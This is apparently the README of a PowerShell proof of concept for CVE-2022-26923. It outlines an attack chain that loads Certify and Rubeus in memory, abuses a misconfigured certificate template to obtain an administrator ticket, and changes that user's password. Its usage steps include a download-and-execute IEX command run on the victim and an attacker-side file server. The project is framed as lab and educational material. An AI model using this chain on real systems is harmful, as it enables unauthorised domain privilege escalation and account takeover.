# CVE-2022-26923-Powershell-POC
A powershell poc to load and automatically run Certify and Rubeus from memory.

# How it works?
1. Loads Certify.exe and Rubeus.exe in memory.
2. Scans the target machine for misconfigured certificate templates. (more on https://www.youtube.com/watch?v=HBRCI5O35R8)
3. Request a certificate for the Administrative user, based on the vulnerable template.
4. Sends the certificate to the certificate handler, it translates it to .pfx format and sends it back to the client.
5. Utilizing Rubeus to load the certificate and generate a ticket for the Administrative user.
6. Changes the password of the Administrative user. (Just for the demo)

The POC is tested on the following TryHackMe Labs: https://tryhackme.com/room/adcertificatetemplates

This CVE is used for privilege escalation, so no initial exploitation is covered on this demo, nor the THM Lab.

Steps:
1. python3 -m http.server 80 [Attacker Box]
2. python3 uploader.py 8000 [Attacker Box]
3. IEX(New-Object Net.WebClient).DownloadString('http://IP/poc.ps1') [Victim Box]

Note: This POC is for educational purpose, you are responsible for your own actions.
